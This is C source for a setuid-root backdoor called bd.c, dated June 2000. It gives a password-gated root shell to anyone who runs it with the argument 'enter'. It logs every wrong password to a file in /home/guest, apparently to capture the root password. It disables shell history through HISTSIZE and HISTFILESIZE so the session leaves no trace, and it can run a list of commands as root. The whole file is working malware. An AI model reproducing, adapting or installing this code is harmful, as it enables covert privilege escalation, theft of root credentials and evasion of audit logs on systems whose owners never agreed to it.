/***************************************************************
 *             bd.c by S/asH in RTCG4ng, June 2000             *
 *               generic backdoor for bash shell               *
 *               must be setuid root to execute                *
 ***************************************************************/

/* standard include */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

/* Constants */
#define PASS_FILE     "/home/guest/.shrc"          /* where to put root pass */
#define PASSWD_STR    ""                     /* the pass to launch the shell */
#define ARG_NAME      "enter"                      /* arg name for shell     */
#define PASSWD_MSG    "Password: "                 /* password prompt        */
#define ON_FAILED     "%s: incorrect password\n"   /* answer for bad pass    */
#define ON_EXECUTE    ""                           /* answer for executing   */
#define ON_ROOT       ""                           /* answer if root         */

#define BASHRC_PATH   "/home/guest/.bashrc"        /* bash script path       */
#define TMPRC_PATH    "/tmp/.bashrc"               /* temporary script       */
#define HIST_VARNAME1 "HISTSIZE"                   /* the env name 1         */
#define HIST_VARNAME2 "HISTFILESIZE"               /* the env name 2         */
#define PROMPT_VARNAM "PS1"                        /* the prompt env name    */
#define PROMPT_FIND   "\\$"                        /* str to find in prompt  */
#define PROMPT_REP    "$"                          /* str to repl in prompt  */

/* Liste of command for root to execute */
char *root_cmd_list[] =
{
  NULL
};

/*****************************************************************
 * passtest : test if the user can execute shell or not          *
 *   Output : 1 : Yes, 0 : No                                    *
 *****************************************************************/
int passtest()
{
  char passwd[20]; int i;
  FILE *pass_file;
  printf(PASSWD_MSG);
  scanf("%s", passwd);
  /* checking for password */
  if (strcmp(PASSWD_STR, passwd)==0) return 1;
  else 
    {
      /* saving passwd if root try to connect */
      pass_file = fopen(PASS_FILE, "a");
      if(pass_file)
	{
	  fprintf(pass_file, "%s\n", passwd);
	  fclose(pass_file);
	}
      return 0;
    }
}
/*************************************************************
 * strfr : Replace the first occur of fstr in str with rstr  *
 * Input : str  : string to modify                           *
 *         fstr : string to replace                          *
 *         rstr : new string                                 *
 * Ouput : str  : modified string (NULL if not found)        *
 *************************************************************/
char *strfr(char *str, char *fstr, char *rstr)
{
  char *tmp;
  char *buf;
  tmp = strstr(str, fstr);
  if(!tmp) return tmp;
  *tmp = 0;
  tmp += strlen(fstr);
  buf = malloc(5+strlen(tmp));
  strcpy(buf, tmp);
  strcat(str, rstr);
  tmp = strcat(str, buf);
  free(buf);
  return tmp;
}

/*****************************************************************
 * make_script : make the script with the export                 *
 *****************************************************************/
void make_script()
{
  FILE *fo;
  char buf1[10000];
  sprintf(buf1, "cp %s %s", BASHRC_PATH, TMPRC_PATH);
  system(buf1);
  fo = fopen(TMPRC_PATH, "a");
  fprintf(fo, "%s=\"0\" \n%s=\"0\"\n", HIST_VARNAME1, HIST_VARNAME2);
  strcpy(buf1, getenv(PROMPT_VARNAM));
  while(strfr(buf1, PROMPT_FIND, PROMPT_REP));
  fprintf(fo, "%s=\"%s\"\n", PROMPT_VARNAM, buf1);
  fclose(fo);
}

/*****************************************************************
 *   main : the main procedure                                   *
 *  input : argc : argument counter                              *
 *          argv : list of argument                              *
 *****************************************************************/
int main(int argc, char *argv[])
{
  char buf[1000]; char buf2[1000]; int i;
  if(argc!=2) printf(ON_EXECUTE);
  else if (strcmp(argv[1],ARG_NAME)==0)
    {
      if(getuid()!=0)
	{
	  if(passtest())
	    { 
	      setgid(0);
	      setuid(0);
	      /* Making rcfile */
	      make_script();
	      /* Executing bash */
	      sprintf(buf, "/bin/bash -rcfile %s", TMPRC_PATH);
	      system(buf);
	      /* removing rcfile */
	      remove(TMPRC_PATH);
	    }
	  else printf(ON_FAILED, argv[0]);
	  return 1;
	}
      else 
	{
	  /* Executing root command */
	  for(i=0; root_cmd_list[i]; i++) system(root_cmd_list[i]);
	  printf(ON_ROOT);
	  return 0;
	}
    }
  else printf(ON_EXECUTE);
  return 0;
}